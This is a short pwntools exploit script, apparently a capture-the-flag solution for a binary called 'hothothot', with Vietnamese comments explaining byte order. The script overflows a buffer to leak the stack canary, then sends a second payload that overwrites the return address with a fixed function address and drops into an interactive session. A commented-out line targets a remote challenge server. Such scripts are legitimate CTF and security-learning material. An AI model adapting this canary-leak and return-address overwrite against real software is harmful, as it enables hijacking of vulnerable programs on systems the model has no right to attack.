from pwn import *
elf = ELF('./hothothot')
p = process(elf.path)
#p = remote('61.14.233.78', 7001)
# gdb.attach(p, gdbscript='''
#            init-pwndbg
#            b *main
#            c
#            ''')
first = b'A'*89 + b"Quack Quack "
p.send(first)
# Lấy hết tất cả những gì được in ra từ chương trình cho đến khi nó hỏi "ready to fight the Duck?\n\n> "
output = p.recvuntil(b"ready to fight the Duck?\n\n> ")
print(output)

leak = output.split(b"Quack Quack ")[2].split(b", ready")[0] # vì dữ liệu được leak từ RAM nên nó sẽ có định dạng bytes và ở dạng litte endian, vì thế nên leak[:8] hay leak[:7] cũng như thế

# u64 biến đổi dữ liệu bytes ở dạng little endian thành số nguyên 64 bit
# print(hex(u64(leak[:8])))         # vì chuyển sang HEX nên ta sẽ thấy nó sẽ có dạng big endian 
# print(hex(u64(b'A' + leak[:7])))  # vì chuyển sang HEX nên ta sẽ thấy nó sẽ có dạng big endian
canary = u64(b'\x00' + leak[:7])
log.info(f"Canary: {hex(canary)}")
#print(hex(elf.sym.duck_attack))

second = flat(
    b'B' * 88,
    p64(canary),
    b'C' * 8,  
    p64(0x40137f),
)

p.send(second)
p.interactive()